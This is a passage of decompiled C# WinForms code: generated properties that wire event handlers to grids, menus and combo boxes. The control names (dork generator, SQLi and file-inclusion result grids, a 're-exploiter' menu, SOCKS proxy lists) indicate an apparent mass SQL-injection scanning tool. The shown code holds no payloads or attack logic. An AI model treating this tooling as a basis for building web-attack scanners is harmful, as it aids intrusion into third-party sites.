				chkSearchColumn.CheckedChanged += value2;
			}
		}
	}

	// Token: 0x17000496 RID: 1174
	// (get) Token: 0x06000DF1 RID: 3569 RVA: 0x00007B46 File Offset: 0x00005D46
	// (set) Token: 0x06000DF2 RID: 3570 RVA: 0x00058744 File Offset: 0x00056944
	internal virtual ToolStripComboBox cmbSearchColumn2
	{
		[CompilerGenerated]
		get
		{
			return this._cmbSearchColumn2;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_176);
			ToolStripComboBox cmbSearchColumn = this._cmbSearchColumn2;
			if (cmbSearchColumn != null)
			{
				cmbSearchColumn.Leave -= value2;
			}
			this._cmbSearchColumn2 = value;
			cmbSearchColumn = this._cmbSearchColumn2;
			if (cmbSearchColumn != null)
			{
				cmbSearchColumn.Leave += value2;
			}
		}
	}

	// Token: 0x17000497 RID: 1175
	// (get) Token: 0x06000DF3 RID: 3571 RVA: 0x00007B4E File Offset: 0x00005D4E
	// (set) Token: 0x06000DF4 RID: 3572 RVA: 0x00058788 File Offset: 0x00056988
	internal virtual ToolStripButton chkSearchColumn3
	{
		[CompilerGenerated]
		get
		{
			return this._chkSearchColumn3;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_183);
			ToolStripButton chkSearchColumn = this._chkSearchColumn3;
			if (chkSearchColumn != null)
			{
				chkSearchColumn.CheckedChanged -= value2;
			}
			this._chkSearchColumn3 = value;
			chkSearchColumn = this._chkSearchColumn3;
			if (chkSearchColumn != null)
			{
				chkSearchColumn.CheckedChanged += value2;
			}
		}
	}

	// Token: 0x17000498 RID: 1176
	// (get) Token: 0x06000DF5 RID: 3573 RVA: 0x00007B56 File Offset: 0x00005D56
	// (set) Token: 0x06000DF6 RID: 3574 RVA: 0x00007B5E File Offset: 0x00005D5E
	internal virtual ToolStripComboBox cmbSearchColumn3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000499 RID: 1177
	// (get) Token: 0x06000DF7 RID: 3575 RVA: 0x00007B67 File Offset: 0x00005D67
	// (set) Token: 0x06000DF8 RID: 3576 RVA: 0x000587CC File Offset: 0x000569CC
	internal virtual ToolStripButton chkSearchColumn4
	{
		[CompilerGenerated]
		get
		{
			return this._chkSearchColumn4;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_184);
			ToolStripButton chkSearchColumn = this._chkSearchColumn4;
			if (chkSearchColumn != null)
			{
				chkSearchColumn.CheckedChanged -= value2;
			}
			this._chkSearchColumn4 = value;
			chkSearchColumn = this._chkSearchColumn4;
			if (chkSearchColumn != null)
			{
				chkSearchColumn.CheckedChanged += value2;
			}
		}
	}

	// Token: 0x1700049A RID: 1178
	// (get) Token: 0x06000DF9 RID: 3577 RVA: 0x00007B6F File Offset: 0x00005D6F
	// (set) Token: 0x06000DFA RID: 3578 RVA: 0x00007B77 File Offset: 0x00005D77
	internal virtual ToolStripComboBox cmbSearchColumn4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700049B RID: 1179
	// (get) Token: 0x06000DFB RID: 3579 RVA: 0x00007B80 File Offset: 0x00005D80
	// (set) Token: 0x06000DFC RID: 3580 RVA: 0x00007B88 File Offset: 0x00005D88
	internal virtual ToolStripSeparator ToolStripSeparator21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700049C RID: 1180
	// (get) Token: 0x06000DFD RID: 3581 RVA: 0x00007B91 File Offset: 0x00005D91
	// (set) Token: 0x06000DFE RID: 3582 RVA: 0x00007B99 File Offset: 0x00005D99
	internal virtual Panel pnlDorkGenerator { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700049D RID: 1181
	// (get) Token: 0x06000DFF RID: 3583 RVA: 0x00007BA2 File Offset: 0x00005DA2
	// (set) Token: 0x06000E00 RID: 3584 RVA: 0x00007BAA File Offset: 0x00005DAA
	internal virtual Panel pnlAnalizer { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700049E RID: 1182
	// (get) Token: 0x06000E01 RID: 3585 RVA: 0x00007BB3 File Offset: 0x00005DB3
	// (set) Token: 0x06000E02 RID: 3586 RVA: 0x00007BBB File Offset: 0x00005DBB
	internal virtual Label lblSearchSummary_1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700049F RID: 1183
	// (get) Token: 0x06000E03 RID: 3587 RVA: 0x00007BC4 File Offset: 0x00005DC4
	// (set) Token: 0x06000E04 RID: 3588 RVA: 0x00007BCC File Offset: 0x00005DCC
	internal virtual DataGridView lvwHttpLog { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004A0 RID: 1184
	// (get) Token: 0x06000E05 RID: 3589 RVA: 0x00007BD5 File Offset: 0x00005DD5
	// (set) Token: 0x06000E06 RID: 3590 RVA: 0x00007BDD File Offset: 0x00005DDD
	internal virtual ToolStripSeparator mnuQueueSP1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004A1 RID: 1185
	// (get) Token: 0x06000E07 RID: 3591 RVA: 0x00007BE6 File Offset: 0x00005DE6
	// (set) Token: 0x06000E08 RID: 3592 RVA: 0x00058810 File Offset: 0x00056A10
	internal virtual ToolStripMenuItem mnuQueueAddURLs
	{
		[CompilerGenerated]
		get
		{
			return this._mnuQueueAddURLs;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_150);
			ToolStripMenuItem mnuQueueAddURLs = this._mnuQueueAddURLs;
			if (mnuQueueAddURLs != null)
			{
				mnuQueueAddURLs.Click -= value2;
			}
			this._mnuQueueAddURLs = value;
			mnuQueueAddURLs = this._mnuQueueAddURLs;
			if (mnuQueueAddURLs != null)
			{
				mnuQueueAddURLs.Click += value2;
			}
		}
	}

	// Token: 0x170004A2 RID: 1186
	// (get) Token: 0x06000E09 RID: 3593 RVA: 0x00007BEE File Offset: 0x00005DEE
	// (set) Token: 0x06000E0A RID: 3594 RVA: 0x00007BF6 File Offset: 0x00005DF6
	internal virtual ToolStripSeparator mnuQueueSP3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004A3 RID: 1187
	// (get) Token: 0x06000E0B RID: 3595 RVA: 0x00007BFF File Offset: 0x00005DFF
	// (set) Token: 0x06000E0C RID: 3596 RVA: 0x00007C07 File Offset: 0x00005E07
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn_0 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004A4 RID: 1188
	// (get) Token: 0x06000E0D RID: 3597 RVA: 0x00007C10 File Offset: 0x00005E10
	// (set) Token: 0x06000E0E RID: 3598 RVA: 0x00007C18 File Offset: 0x00005E18
	internal virtual DataGridViewTextBoxColumn clURL { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004A5 RID: 1189
	// (get) Token: 0x06000E0F RID: 3599 RVA: 0x00007C21 File Offset: 0x00005E21
	// (set) Token: 0x06000E10 RID: 3600 RVA: 0x00007C29 File Offset: 0x00005E29
	internal virtual DataGridViewTextBoxColumn Column2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004A6 RID: 1190
	// (get) Token: 0x06000E11 RID: 3601 RVA: 0x00007C32 File Offset: 0x00005E32
	// (set) Token: 0x06000E12 RID: 3602 RVA: 0x00007C3A File Offset: 0x00005E3A
	internal virtual DataGridViewTextBoxColumn Column4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004A7 RID: 1191
	// (get) Token: 0x06000E13 RID: 3603 RVA: 0x00007C43 File Offset: 0x00005E43
	// (set) Token: 0x06000E14 RID: 3604 RVA: 0x00007C4B File Offset: 0x00005E4B
	internal virtual DataGridViewTextBoxColumn Column3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004A8 RID: 1192
	// (get) Token: 0x06000E15 RID: 3605 RVA: 0x00007C54 File Offset: 0x00005E54
	// (set) Token: 0x06000E16 RID: 3606 RVA: 0x00007C5C File Offset: 0x00005E5C
	internal virtual DataGridViewTextBoxColumn ProxyIP { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004A9 RID: 1193
	// (get) Token: 0x06000E17 RID: 3607 RVA: 0x00007C65 File Offset: 0x00005E65
	// (set) Token: 0x06000E18 RID: 3608 RVA: 0x00058854 File Offset: 0x00056A54
	internal virtual ToolStripMenuItem mnuLWReExploiter
	{
		[CompilerGenerated]
		get
		{
			return this._mnuLWReExploiter;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_14);
			ToolStripMenuItem mnuLWReExploiter = this._mnuLWReExploiter;
			if (mnuLWReExploiter != null)
			{
				mnuLWReExploiter.Click -= value2;
			}
			this._mnuLWReExploiter = value;
			mnuLWReExploiter = this._mnuLWReExploiter;
			if (mnuLWReExploiter != null)
			{
				mnuLWReExploiter.Click += value2;
			}
		}
	}

	// Token: 0x170004AA RID: 1194
	// (get) Token: 0x06000E19 RID: 3609 RVA: 0x00007C6D File Offset: 0x00005E6D
	// (set) Token: 0x06000E1A RID: 3610 RVA: 0x00058898 File Offset: 0x00056A98
	internal virtual ToolStripComboBox cmbSQLiFilter
	{
		[CompilerGenerated]
		get
		{
			return this._cmbSQLiFilter;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_173);
			ToolStripComboBox cmbSQLiFilter = this._cmbSQLiFilter;
			if (cmbSQLiFilter != null)
			{
				cmbSQLiFilter.SelectedIndexChanged -= value2;
			}
			this._cmbSQLiFilter = value;
			cmbSQLiFilter = this._cmbSQLiFilter;
			if (cmbSQLiFilter != null)
			{
				cmbSQLiFilter.SelectedIndexChanged += value2;
			}
		}
	}

	// Token: 0x170004AB RID: 1195
	// (get) Token: 0x06000E1B RID: 3611 RVA: 0x00007C75 File Offset: 0x00005E75
	// (set) Token: 0x06000E1C RID: 3612 RVA: 0x000588DC File Offset: 0x00056ADC
	internal virtual ToolStripComboBox cmbSQLiNoInjectableFilter
	{
		[CompilerGenerated]
		get
		{
			return this._cmbSQLiNoInjectableFilter;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_173);
			ToolStripComboBox cmbSQLiNoInjectableFilter = this._cmbSQLiNoInjectableFilter;
			if (cmbSQLiNoInjectableFilter != null)
			{
				cmbSQLiNoInjectableFilter.SelectedIndexChanged -= value2;
			}
			this._cmbSQLiNoInjectableFilter = value;
			cmbSQLiNoInjectableFilter = this._cmbSQLiNoInjectableFilter;
			if (cmbSQLiNoInjectableFilter != null)
			{
				cmbSQLiNoInjectableFilter.SelectedIndexChanged += value2;
			}
		}
	}

	// Token: 0x170004AC RID: 1196
	// (get) Token: 0x06000E1D RID: 3613 RVA: 0x00007C7D File Offset: 0x00005E7D
	// (set) Token: 0x06000E1E RID: 3614 RVA: 0x00058920 File Offset: 0x00056B20
	internal virtual ToolStripComboBox cmbFileInclusaoFilter
	{
		[CompilerGenerated]
		get
		{
			return this._cmbFileInclusaoFilter;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_173);
			ToolStripComboBox cmbFileInclusaoFilter = this._cmbFileInclusaoFilter;
			if (cmbFileInclusaoFilter != null)
			{
				cmbFileInclusaoFilter.SelectedIndexChanged -= value2;
			}
			this._cmbFileInclusaoFilter = value;
			cmbFileInclusaoFilter = this._cmbFileInclusaoFilter;
			if (cmbFileInclusaoFilter != null)
			{
				cmbFileInclusaoFilter.SelectedIndexChanged += value2;
			}
		}
	}

	// Token: 0x170004AD RID: 1197
	// (get) Token: 0x06000E1F RID: 3615 RVA: 0x00007C85 File Offset: 0x00005E85
	// (set) Token: 0x06000E20 RID: 3616 RVA: 0x00058964 File Offset: 0x00056B64
	internal virtual ToolStripMenuItem mnuAboutHWID
	{
		[CompilerGenerated]
		get
		{
			return this._mnuAboutHWID;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_119);
			ToolStripMenuItem mnuAboutHWID = this._mnuAboutHWID;
			if (mnuAboutHWID != null)
			{
				mnuAboutHWID.Click -= value2;
			}
			this._mnuAboutHWID = value;
			mnuAboutHWID = this._mnuAboutHWID;
			if (mnuAboutHWID != null)
			{
				mnuAboutHWID.Click += value2;
			}
		}
	}

	// Token: 0x170004AE RID: 1198
	// (get) Token: 0x06000E21 RID: 3617 RVA: 0x00007C8D File Offset: 0x00005E8D
	// (set) Token: 0x06000E22 RID: 3618 RVA: 0x00007C95 File Offset: 0x00005E95
	internal virtual CheckBox chkScanningBlackListProxy { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004AF RID: 1199
	// (get) Token: 0x06000E23 RID: 3619 RVA: 0x00007C9E File Offset: 0x00005E9E
	// (set) Token: 0x06000E24 RID: 3620 RVA: 0x00007CA6 File Offset: 0x00005EA6
	internal virtual ToolStrip tsSearchFilter { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004B0 RID: 1200
	// (get) Token: 0x06000E25 RID: 3621 RVA: 0x00007CAF File Offset: 0x00005EAF
	// (set) Token: 0x06000E26 RID: 3622 RVA: 0x00007CB7 File Offset: 0x00005EB7
	internal virtual ToolStripComboBox txtSearchFilter { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004B1 RID: 1201
	// (get) Token: 0x06000E27 RID: 3623 RVA: 0x00007CC0 File Offset: 0x00005EC0
	// (set) Token: 0x06000E28 RID: 3624 RVA: 0x000589A8 File Offset: 0x00056BA8
	internal virtual ToolStripButton btnSearchFilter
	{
		[CompilerGenerated]
		get
		{
			return this._btnSearchFilter;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_185);
			ToolStripButton btnSearchFilter = this._btnSearchFilter;
			if (btnSearchFilter != null)
			{
				btnSearchFilter.CheckedChanged -= value2;
			}
			this._btnSearchFilter = value;
			btnSearchFilter = this._btnSearchFilter;
			if (btnSearchFilter != null)
			{
				btnSearchFilter.CheckedChanged += value2;
			}
		}
	}

	// Token: 0x170004B2 RID: 1202
	// (get) Token: 0x06000E29 RID: 3625 RVA: 0x00007CC8 File Offset: 0x00005EC8
	// (set) Token: 0x06000E2A RID: 3626 RVA: 0x00007CD0 File Offset: 0x00005ED0
	internal virtual ToolStripSeparator ToolStripSeparator9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004B3 RID: 1203
	// (get) Token: 0x06000E2B RID: 3627 RVA: 0x00007CD9 File Offset: 0x00005ED9
	// (set) Token: 0x06000E2C RID: 3628 RVA: 0x000589EC File Offset: 0x00056BEC
	internal virtual DataGridView dtgQueue
	{
		[CompilerGenerated]
		get
		{
			return this._dtgQueue;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			MouseEventHandler value2 = new MouseEventHandler(this.method_156);
			DataGridViewCellMouseEventHandler value3 = new DataGridViewCellMouseEventHandler(this.method_157);
			KeyEventHandler value4 = new KeyEventHandler(this.method_188);
			DataGridView dtgQueue = this._dtgQueue;
			if (dtgQueue != null)
			{
				dtgQueue.MouseDown -= value2;
				dtgQueue.CellMouseDown -= value3;
				dtgQueue.KeyDown -= value4;
			}
			this._dtgQueue = value;
			dtgQueue = this._dtgQueue;
			if (dtgQueue != null)
			{
				dtgQueue.MouseDown += value2;
				dtgQueue.CellMouseDown += value3;
				dtgQueue.KeyDown += value4;
			}
		}
	}

	// Token: 0x170004B4 RID: 1204
	// (get) Token: 0x06000E2D RID: 3629 RVA: 0x00007CE1 File Offset: 0x00005EE1
	// (set) Token: 0x06000E2E RID: 3630 RVA: 0x00007CE9 File Offset: 0x00005EE9
	internal virtual DataGridViewTextBoxColumn Column1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004B5 RID: 1205
	// (get) Token: 0x06000E2F RID: 3631 RVA: 0x00007CF2 File Offset: 0x00005EF2
	// (set) Token: 0x06000E30 RID: 3632 RVA: 0x00058A68 File Offset: 0x00056C68
	internal virtual DataGridView dtgTrash
	{
		[CompilerGenerated]
		get
		{
			return this._dtgTrash;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			KeyEventHandler value2 = new KeyEventHandler(this.method_149);
			DataGridView dtgTrash = this._dtgTrash;
			if (dtgTrash != null)
			{
				dtgTrash.KeyDown -= value2;
			}
			this._dtgTrash = value;
			dtgTrash = this._dtgTrash;
			if (dtgTrash != null)
			{
				dtgTrash.KeyDown += value2;
			}
		}
	}

	// Token: 0x170004B6 RID: 1206
	// (get) Token: 0x06000E31 RID: 3633 RVA: 0x00007CFA File Offset: 0x00005EFA
	// (set) Token: 0x06000E32 RID: 3634 RVA: 0x00007D02 File Offset: 0x00005F02
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004B7 RID: 1207
	// (get) Token: 0x06000E33 RID: 3635 RVA: 0x00007D0B File Offset: 0x00005F0B
	// (set) Token: 0x06000E34 RID: 3636 RVA: 0x00007D13 File Offset: 0x00005F13
	internal virtual ToolStripSeparator ToolStripSeparator17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004B8 RID: 1208
	// (get) Token: 0x06000E35 RID: 3637 RVA: 0x00007D1C File Offset: 0x00005F1C
	// (set) Token: 0x06000E36 RID: 3638 RVA: 0x00058AAC File Offset: 0x00056CAC
	internal virtual ToolStripButton btnSocksUrl
	{
		[CompilerGenerated]
		get
		{
			return this._btnSocksUrl;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_200);
			ToolStripButton btnSocksUrl = this._btnSocksUrl;
			if (btnSocksUrl != null)
			{
				btnSocksUrl.Click -= value2;
			}
			this._btnSocksUrl = value;
			btnSocksUrl = this._btnSocksUrl;
			if (btnSocksUrl != null)
			{
				btnSocksUrl.Click += value2;
			}
		}
	}

	// Token: 0x170004B9 RID: 1209
	// (get) Token: 0x06000E37 RID: 3639 RVA: 0x00007D24 File Offset: 0x00005F24
	// (set) Token: 0x06000E38 RID: 3640 RVA: 0x00007D2C File Offset: 0x00005F2C
	internal virtual ToolStripSeparator ToolStripSeparator14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004BA RID: 1210
	// (get) Token: 0x06000E39 RID: 3641 RVA: 0x00007D35 File Offset: 0x00005F35
	// (set) Token: 0x06000E3A RID: 3642 RVA: 0x00058AF0 File Offset: 0x00056CF0
	internal virtual DataGridView dtgSQLi
	{
		[CompilerGenerated]
		get
		{
			return this._dtgSQLi;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			DataGridViewCellMouseEventHandler value2 = new DataGridViewCellMouseEventHandler(this.method_157);
			DataGridViewCellEventHandler value3 = new DataGridViewCellEventHandler(this.method_165);
			EventHandler value4 = new EventHandler(this.method_187);
			KeyEventHandler value5 = new KeyEventHandler(this.method_188);
			DataGridViewCellEventHandler value6 = new DataGridViewCellEventHandler(this.method_189);
			DataGridView dtgSQLi = this._dtgSQLi;
			if (dtgSQLi != null)
			{
				dtgSQLi.CellMouseDown -= value2;
				dtgSQLi.CellDoubleClick -= value3;
				dtgSQLi.SelectionChanged -= value4;
				dtgSQLi.KeyDown -= value5;
				dtgSQLi.CellValueChanged -= value6;
			}
			this._dtgSQLi = value;
			dtgSQLi = this._dtgSQLi;
			if (dtgSQLi != null)
			{
				dtgSQLi.CellMouseDown += value2;
				dtgSQLi.CellDoubleClick += value3;
				dtgSQLi.SelectionChanged += value4;
				dtgSQLi.KeyDown += value5;
				dtgSQLi.CellValueChanged += value6;
			}
		}
	}

	// Token: 0x170004BB RID: 1211
	// (get) Token: 0x06000E3B RID: 3643 RVA: 0x00007D3D File Offset: 0x00005F3D
	// (set) Token: 0x06000E3C RID: 3644 RVA: 0x00058BB0 File Offset: 0x00056DB0
	internal virtual DataGridView dtgFileInclusao
	{
		[CompilerGenerated]
		get
		{
			return this._dtgFileInclusao;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			DataGridViewCellMouseEventHandler value2 = new DataGridViewCellMouseEventHandler(this.method_157);
			KeyEventHandler value3 = new KeyEventHandler(this.method_188);
			DataGridViewCellEventHandler value4 = new DataGridViewCellEventHandler(this.method_189);
			DataGridView dtgFileInclusao = this._dtgFileInclusao;
			if (dtgFileInclusao != null)
			{
				dtgFileInclusao.CellMouseDown -= value2;
				dtgFileInclusao.KeyDown -= value3;
				dtgFileInclusao.CellValueChanged -= value4;
			}
			this._dtgFileInclusao = value;
			dtgFileInclusao = this._dtgFileInclusao;
			if (dtgFileInclusao != null)
			{
				dtgFileInclusao.CellMouseDown += value2;
				dtgFileInclusao.KeyDown += value3;
				dtgFileInclusao.CellValueChanged += value4;
			}
		}
	}

	// Token: 0x170004BC RID: 1212
	// (get) Token: 0x06000E3D RID: 3645 RVA: 0x00007D45 File Offset: 0x00005F45
	// (set) Token: 0x06000E3E RID: 3646 RVA: 0x00058C2C File Offset: 0x00056E2C
	internal virtual DataGridView dtgSQLiNoInjectable
	{
		[CompilerGenerated]
		get
		{
			return this._dtgSQLiNoInjectable;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			DataGridViewCellMouseEventHandler value2 = new DataGridViewCellMouseEventHandler(this.method_157);
			KeyEventHandler value3 = new KeyEventHandler(this.method_188);
			DataGridViewCellEventHandler value4 = new DataGridViewCellEventHandler(this.method_189);
			DataGridView dtgSQLiNoInjectable = this._dtgSQLiNoInjectable;
			if (dtgSQLiNoInjectable != null)
			{
				dtgSQLiNoInjectable.CellMouseDown -= value2;
				dtgSQLiNoInjectable.KeyDown -= value3;
				dtgSQLiNoInjectable.CellValueChanged -= value4;
			}
			this._dtgSQLiNoInjectable = value;
			dtgSQLiNoInjectable = this._dtgSQLiNoInjectable;
			if (dtgSQLiNoInjectable != null)
			{
				dtgSQLiNoInjectable.CellMouseDown += value2;
				dtgSQLiNoInjectable.KeyDown += value3;
				dtgSQLiNoInjectable.CellValueChanged += value4;
			}
		}
	}

	// Token: 0x170004BD RID: 1213
	// (get) Token: 0x06000E3F RID: 3647 RVA: 0x00007D4D File Offset: 0x00005F4D
	// (set) Token: 0x06000E40 RID: 3648 RVA: 0x00007D55 File Offset: 0x00005F55
	internal virtual Panel pnlTree { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004BE RID: 1214
	// (get) Token: 0x06000E41 RID: 3649 RVA: 0x00007D5E File Offset: 0x00005F5E
	// (set) Token: 0x06000E42 RID: 3650 RVA: 0x00058CA8 File Offset: 0x00056EA8
	internal virtual DataGridView dtgSocks
	{
		[CompilerGenerated]
		get
		{
			return this._dtgSocks;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			KeyEventHandler value2 = new KeyEventHandler(this.method_188);
			DataGridView dtgSocks = this._dtgSocks;
			if (dtgSocks != null)
			{
				dtgSocks.KeyDown -= value2;
			}
			this._dtgSocks = value;
			dtgSocks = this._dtgSocks;
			if (dtgSocks != null)
			{
				dtgSocks.KeyDown += value2;
			}
		}
	}

	// Token: 0x170004BF RID: 1215
	// (get) Token: 0x06000E43 RID: 3651 RVA: 0x00007D66 File Offset: 0x00005F66
	// (set) Token: 0x06000E44 RID: 3652 RVA: 0x00007D6E File Offset: 0x00005F6E
	internal virtual ImageList imlTree { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004C0 RID: 1216
	// (get) Token: 0x06000E45 RID: 3653 RVA: 0x00007D77 File Offset: 0x00005F77
	// (set) Token: 0x06000E46 RID: 3654 RVA: 0x00007D7F File Offset: 0x00005F7F
	internal virtual Label lblGuiStyle { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004C1 RID: 1217
	// (get) Token: 0x06000E47 RID: 3655 RVA: 0x00007D88 File Offset: 0x00005F88
	// (set) Token: 0x06000E48 RID: 3656 RVA: 0x00058CEC File Offset: 0x00056EEC
	internal virtual ComboBox cmbGuiStyle
	{
		[CompilerGenerated]
		get
		{
			return this._cmbGuiStyle;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_109);
			ComboBox cmbGuiStyle = this._cmbGuiStyle;
			if (cmbGuiStyle != null)
			{
				cmbGuiStyle.SelectedIndexChanged -= value2;
			}
			this._cmbGuiStyle = value;
			cmbGuiStyle = this._cmbGuiStyle;
			if (cmbGuiStyle != null)
			{
				cmbGuiStyle.SelectedIndexChanged += value2;
			}
		}
	}

	// Token: 0x170004C2 RID: 1218
	// (get) Token: 0x06000E49 RID: 3657 RVA: 0x00007D90 File Offset: 0x00005F90
	// (set) Token: 0x06000E4A RID: 3658 RVA: 0x00058D30 File Offset: 0x00056F30
	internal virtual ToolStripButton chkHideDork
	{
		[CompilerGenerated]
		get
		{
			return this._chkHideDork;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_90);
			ToolStripButton chkHideDork = this._chkHideDork;
			if (chkHideDork != null)
			{
				chkHideDork.CheckedChanged -= value2;
			}
			this._chkHideDork = value;
			chkHideDork = this._chkHideDork;
			if (chkHideDork != null)
			{
				chkHideDork.CheckedChanged += value2;
			}
		}
	}

	// Token: 0x170004C3 RID: 1219
	// (get) Token: 0x06000E4B RID: 3659 RVA: 0x00007D98 File Offset: 0x00005F98
	// (set) Token: 0x06000E4C RID: 3660 RVA: 0x00007DA0 File Offset: 0x00005FA0
	internal virtual DataGridViewCheckBoxColumn Column14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004C4 RID: 1220
	// (get) Token: 0x06000E4D RID: 3661 RVA: 0x00007DA9 File Offset: 0x00005FA9
	// (set) Token: 0x06000E4E RID: 3662 RVA: 0x00007DB1 File Offset: 0x00005FB1
	internal virtual DataGridViewImageColumn DataGridViewImageColumn3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004C5 RID: 1221
	// (get) Token: 0x06000E4F RID: 3663 RVA: 0x00007DBA File Offset: 0x00005FBA
	// (set) Token: 0x06000E50 RID: 3664 RVA: 0x00007DC2 File Offset: 0x00005FC2
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004C6 RID: 1222
	// (get) Token: 0x06000E51 RID: 3665 RVA: 0x00007DCB File Offset: 0x00005FCB
	// (set) Token: 0x06000E52 RID: 3666 RVA: 0x00007DD3 File Offset: 0x00005FD3
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004C7 RID: 1223
	// (get) Token: 0x06000E53 RID: 3667 RVA: 0x00007DDC File Offset: 0x00005FDC
	// (set) Token: 0x06000E54 RID: 3668 RVA: 0x00007DE4 File Offset: 0x00005FE4
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004C8 RID: 1224
	// (get) Token: 0x06000E55 RID: 3669 RVA: 0x00007DED File Offset: 0x00005FED
	// (set) Token: 0x06000E56 RID: 3670 RVA: 0x00007DF5 File Offset: 0x00005FF5
	internal virtual DataGridViewTextBoxColumn Column5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004C9 RID: 1225
	// (get) Token: 0x06000E57 RID: 3671 RVA: 0x00007DFE File Offset: 0x00005FFE
	// (set) Token: 0x06000E58 RID: 3672 RVA: 0x00007E06 File Offset: 0x00006006
	internal virtual DataGridViewTextBoxColumn Column15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004CA RID: 1226
	// (get) Token: 0x06000E59 RID: 3673 RVA: 0x00007E0F File Offset: 0x0000600F
	// (set) Token: 0x06000E5A RID: 3674 RVA: 0x00007E17 File Offset: 0x00006017
	internal virtual UxTabControl tabSQLi { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004CB RID: 1227
	// (get) Token: 0x06000E5B RID: 3675 RVA: 0x00007E20 File Offset: 0x00006020
	// (set) Token: 0x06000E5C RID: 3676 RVA: 0x00007E28 File Offset: 0x00006028
	internal virtual UxTabControl tabScanner { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170004CC RID: 1228
	// (get) Token: 0x06000E5D RID: 3677 RVA: 0x00007E31 File Offset: 0x00006031
	// (set) Token: 0x06000E5E RID: 3678 RVA: 0x00007E39 File Offset: 0x00006039
	internal virtual UxTabControl tabFileInc { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

